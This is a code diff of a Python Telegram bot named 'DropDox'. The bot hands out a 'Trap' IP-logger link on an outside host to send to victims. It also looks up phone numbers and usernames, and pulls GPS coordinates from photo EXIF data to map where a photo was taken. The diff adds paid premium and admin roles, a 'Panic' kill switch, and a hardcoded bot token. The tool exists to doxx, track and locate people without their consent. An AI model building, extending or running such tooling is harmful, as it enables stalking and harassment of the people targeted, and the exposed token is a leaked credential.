@@ -1,180 +1,160 @@
 import logging
 import os
+import json
 import requests
 import phonenumbers
+from datetime import datetime, timedelta
 from PIL import Image
 from PIL.ExifTags import TAGS
 from phonenumbers import carrier, geocoder
 from aiogram import Bot, Dispatcher, executor, types
 
-# --- НАСТРОЙКИ ---
+# --- [ КОНФИГУРАЦИЯ ] ---
 API_TOKEN = '8504796844:AAGVerEJuDpiCiR-HxyP7t2GAfY-dFgAq3k'
+OWNER_ID = 8380479728 
 LOGGER_URL = "https://portfolio-myweb.up.railway.app/track"
+DATA_FILE = "users_db.json"
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher(bot)
 
-# --- КНОПКИ ---
-menu = types.ReplyKeyboardMarkup(resize_keyboard=True)
-menu.add("🪤 Trap", "📱 Dox Phone", "👤 Dox User")
-menu.add("🖼 EXIF Data", "🚨 Panic")
+# --- [ РАБОТА С БАЗОЙ ] ---
+def load_db():
+    if not os.path.exists(DATA_FILE):
+        return {"premium": {}, "admins": [], "banned": []}
+    try:
+        with open(DATA_FILE, "r") as f:
+            return json.load(f)
+    except:
+        return {"premium": {}, "admins": [], "banned": []}
 
+def save_db(data):
+    with open(DATA_FILE, "w") as f:
+        json.dump(data, f, indent=4)
+
+def get_role(user_id):
+    if user_id == OWNER_ID: return "Owner"
+    db = load_db()
+    if user_id in db["banned"]: return "Banned"
+    if user_id in db["admins"]: return "Admin"
+    
+    uid_str = str(user_id)
+    if uid_str in db["premium"]:
+        expiry = datetime.strptime(db["premium"][uid_str], "%Y-%m-%d")
+        if datetime.now() <= expiry:
+            return "Premium"
+        else:
+            del db["premium"][uid_str]
+            save_db(db)
+    return "User"
+
+def get_decimal_coords(gps_info):
+    try:
+        def convert(v):
+            return float(v[0]) + (float(v[1]) / 60.0) + (float(v[2]) / 3600.0)
+        lat = convert(gps_info[2])
+        if gps_info[1] != 'N': lat = -lat
+        lon = convert(gps_info[4])
+        if gps_info[3] != 'E': lon = -lon
+        return lat, lon
+    except: return None
+
+# --- [ КОМАНДЫ УПРАВЛЕНИЯ ] ---
+@dp.message_handler(commands=['give_access'])
+async def give_access(m: types.Message):
+    if get_role(m.from_user.id) not in ["Owner", "Admin"]: return
+    try:
+        args = m.get_args().split()
+        target_id, days = args[0], int(args[1])
+        db = load_db()
+        expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
+        db["premium"][target_id] = expiry
+        save_db(db)
+        await m.answer(f"✅ Доступ для {target_id} до {expiry}")
+    except: await m.answer("Юзать: /give_access ID ДНИ")
+
+@dp.message_handler(commands=['ban'])
+async def cmd_ban(m: types.Message):
+    if get_role(m.from_user.id) not in ["Owner", "Admin"]: return
+    try:
+        uid = int(m.get_args())
+        if uid == OWNER_ID: return
+        db = load_db()
+        if uid not in db["banned"]: db["banned"].append(uid)
+        save_db(db)
+        await m.answer(f"🚫 ID {uid} забанен.")
+    except: await m.answer("Юзай: /ban ID")
+
+# --- [ ОСНОВНОЕ МЕНЮ ] ---
 @dp.message_handler(commands=['start'])
-async def start(message: types.Message):
-    await message.answer("🦾 DropDox Ultimate v0.2.0 запущен.\nОтправь номер, @username или фото (как файл).", reply_markup=menu)
+async def start(m: types.Message):
+    role = get_role(m.from_user.id)
+    if role == "Banned": return
+    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    kb.add("🪤 Trap", "📱 Dox Phone")
+    if role in ["Premium", "Admin", "Owner"]: kb.add("👤 Dox User", "🖼 EXIF Data")
+    if role in ["Owner", "Admin"]: kb.add("🚨 Panic", "📊 Stats")
+    await m.answer(f"🦾 <b>DropDox v0.4.0</b>\nТвой статус: <b>{role}</b>", reply_markup=kb, parse_mode="HTML")
 
-# --- 1. TRAP ---
+# --- [ ФУНКЦИИ ПРОБИВА ] ---
 @dp.message_handler(lambda m: m.text == "🪤 Trap")
 async def trap(m: types.Message):
     await m.answer(f"🔗 Ссылка-капкан:\n<code>{LOGGER_URL}?id={m.from_user.id}</code>", parse_mode="HTML")
 
-# --- 2. DOX PHONE (+7...) ---
 @dp.message_handler(lambda m: m.text.startswith('+'))
-async def dox_phone(m: types.Message):
+async def dox_ph(m: types.Message):
     try:
         num = phonenumbers.parse(m.text)
-        res = f"📡 Оператор: {carrier.name_for_number(num, 'ru')}\n🌍 Регион: {geocoder.description_for_number(num, 'ru')}"
-        await m.answer(f"🔍 Результат:\n{res}\n\n🔗 <a href='https://www.google.com/search?q=%22{m.text}%22'>Поиск в Google</a>", parse_mode="HTML")
-    except:
-        await m.answer("❌ Ошибка формата.")
+        res = f"📡 Опер: {carrier.name_for_number(num, 'ru')}\n🌍 Регион: {geocoder.description_for_number(num, 'ru')}"
+        await m.answer(f"🔍 <b>Результат:</b>\n{res}\n\n🔗 <a href='https://www.google.com/search?q=%22{m.text}%22'>Google</a>", parse_mode="HTML")
+    except: await m.answer("❌ Ошибка формата.")
 
-# --- 3. DOX @USER ---
-@dp.message_handler(lambda m: m.text.startswith('@') or m.text == "👤 Dox User")
-async def dox_user(m: types.Message):
-    if m.text == "👤 Dox User":
-        await m.answer("Введи ник в формате @username")
-        return
+@dp.message_handler(lambda m: m.text == "👤 Dox User" or (m.text and m.text.startswith('@')))
+async def dox_us(m: types.Message):
+    if get_role(m.from_user.id) == "User":
+        return await m.answer("⭐ Купи Premium для поиска по нику.")
     user = m.text.replace('@', '')
-    res = (
-        f"👤 <b>Анализ ника {user}:</b>\n\n"
-        f"🔗 <a href='https://t.me/{user}'>Telegram Profile</a>\n"
-        f"🔗 <a href='https://instagram.com/{user}'>Instagram</a>\n"
-        f"🔗 <a href='https://github.com/{user}'>GitHub</a>\n"
-        f"🔗 <a href='https://www.google.com/search?q={user}'>Google Search</a>"
-    )
+    if user == "👤 Dox User": return await m.answer("Введи @username")
+    res = f"👤 <b>Ник {user}:</b>\n🔗 <a href='https://t.me/{user}'>Telegram</a>\n🔗 <a href='https://www.google.com/search?q={user}'>Google</a>"
     await m.answer(res, parse_mode="HTML", disable_web_page_preview=True)
 
-# --- 4. EXIF (ФОТО) ---
 @dp.message_handler(content_types=['document', 'photo'])
-def get_decimal_coords(gps_info):
-    try:
-        def convert_to_degrees(value):
-            d = float(value[0])
-            m = float(value[1])
-            s = float(value[2])
-            return d + (m / 60.0) + (s / 3600.0)
-
-        # GPSInfo теги: 1 - N/S, 2 - Latitude, 3 - E/W, 4 - Longitude
-        lat_ref = gps_info[1]
-        lat_val = gps_info[2]
-        lon_ref = gps_info[3]
-        lon_val = gps_info[4]
-
-        lat = convert_to_degrees(lat_val)
-        if lat_ref != 'N': lat = -lat
-
-        lon = convert_to_degrees(lon_val)
-        if lon_ref != 'E': lon = -lon
-
-        return lat, lon
-    except Exception as e:
-        logging.error(f"Ошибка GPS конвертации: {e}")
-        return None
-
-# --- 4. EXIF (ФОТО) ОБНОВЛЕННЫЙ ---
-@dp.message_handler(content_types=['document', 'photo'])
-async def extract_exif(message: types.Message):
-    await message.answer("📥 Принимаю файл, анализирую метаданные...")
-    
-    # Берем файл (оригинал, если отправлен как документ)
-    file_id = message.document.file_id if message.document else message.photo[-1].file_id
-    file_info = await bot.get_file(file_id)
-    downloaded_file = await bot.download_file(file_info.file_path)
-    
-    temp_filename = f"temp_{message.from_user.id}.jpg"
-    with open(temp_filename, 'wb') as f:
-        f.write(downloaded_file.read())
-    
-    try:
-        img = Image.open(temp_filename)
-        info = img._getexif()
-        
-        if not info:
-            await message.answer("ℹ️ В этом фото нет метаданных EXIF. (Telegram часто стирает их при отправке обычным фото. Пробуй отправлять 'как файл').")
-            os.remove(temp_filename)
-            return
-
-        # 1. Читаем все данные (стандартно)
-        exif_data = ""
-        gps_raw = None
-        make = "Unknown"
-        model = "Unknown"
-        
-        for tag, value in info.items():
-            decoded = TAGS.get(tag, tag)
-            if decoded == "GPSInfo":
-                gps_raw = value # Сохраняем для карты
-            
-            # Собираем инфо для краткого отчета
-            if decoded == "Make": make = value
-            if decoded == "Model": model = value
-            
-            # Полный лог (если нужно, можно закомментить)
-            # exif_data += f"<b>{decoded}:</b> {value}\n"
-
-        # 2. Обрабатываем GPS и делаем карту
-        map_link = ""
-        if gps_raw:
-            coords = get_decimal_coords(gps_raw)
-            if coords:
-                lat, lon = coords
-                # Генерируем ссылку на Google Карты (режим спутника)
-                map_link = f"https://www.google.com/maps/place/{lat},{lon}/@{lat},{lon},17z/data=!3m1!1e3"
-
-        # 3. Формируем ответ
-        report = (
-            f"🖼 <b>Результат анализа фото:</b>\n\n"
-            f"📱 <b>Устройство:</b> {make} {model}\n"
-        )
-        
-        if map_link:
-            report += f"\n📍 <b>НАЙДЕНО МЕСТО СЪЕМКИ:</b>\n<a href='{map_link}'>Открыть Google Карты (Спутник)</a>"
-        else:
-            report += "\n🌐 Координаты в фото не найдены."
-            
-        await message.answer(report, parse_mode="HTML", disable_web_page_preview=False)
-
-    except Exception as e:
-        await message.answer(f"❌ Ошибка при чтении файла: {e}")
-    
-    finally:
-        # Удаляем временный файл
-        if os.path.exists(temp_filename):
-            os.remove(temp_filename)
-            
-async def extract_exif(message: types.Message):
-    # Берем файл (лучше кидать как документ, чтобы ТГ не сжимал и не тер EXIF)
-    file_id = message.document.file_id if message.document else message.photo[-1].file_id
-    file_info = await bot.get_file(file_id)
-    downloaded_file = await bot.download_file(file_info.file_path)
-    
-    with open("temp.jpg", 'wb') as f:
-        f.write(downloaded_file.read())
-    
+async def exif_handler(m: types.Message):
+    if get_role(m.from_user.id) == "User": return await m.answer("⭐ EXIF доступен только Premium.")
+    await m.answer("📥 Анализ метаданных...")
+    f_id = m.document.file_id if m.document else m.photo[-1].file_id
+    f_info = await bot.get_file(f_id)
+    f_down = await bot.download_file(f_info.file_path)
+    with open("temp.jpg", 'wb') as f: f.write(f_down.read())
     try:
         img = Image.open("temp.jpg")
         info = img._getexif()
-        if info:
-            exif_data = ""
-            for tag, value in info.items():
-                decoded = TAGS.get(tag, tag)
-                exif_data += f"<b>{decoded}:</b> {value}\n"
-            await message.answer(f"🖼 <b>EXIF Данные:</b>\n\n{exif_data[:3500]}", parse_mode="HTML")
-        else:
-            await message.answer("ℹ️ В фото нет метаданных (EXIF). Telegram часто стирает их при отправке 'как фото'. Попробуй отправить 'как файл'.")
-    except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
+        if not info: return await m.answer("ℹ️ Нет EXIF. Шли файлом.")
+        make, model, map_link = "N/A", "N/A", None
+        for t, v in info.items():
+            tag = TAGS.get(t, t)
+            if tag == "Make": make = v
+            if tag == "Model": model = v
+            if tag == "GPSInfo":
+                coords = get_decimal_coords(v)
+                if coords: map_link = f"https://www.google.com/maps?q={coords[0]},{coords[1]}&t=k"
+        res = f"🖼 <b>Метаданные:</b>\n📱 {make} {model}"
+        if map_link: res += f"\n📍 <a href='{map_link}'>КАРТА (Спутник)</a>"
+        await m.answer(res, parse_mode="HTML")
+    except Exception as e: await m.answer(f"❌ Ошибка: {e}")
+    finally: 
+        if os.path.exists("temp.jpg"): os.remove("temp.jpg")
+
+@dp.message_handler(lambda m: m.text in ["🚨 Panic", "📊 Stats"])
+async def adm_tools(m: types.Message):
+    role = get_role(m.from_user.id)
+    if role not in ["Owner", "Admin"]: return
+    if m.text == "📊 Stats":
+        db = load_db()
+        await m.answer(f"📊 <b>Статистика:</b>\nПремиум: {len(db['premium'])}\nБаны: {len(db['banned'])}", parse_mode="HTML")
+    else: os._exit(0)
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
+                   
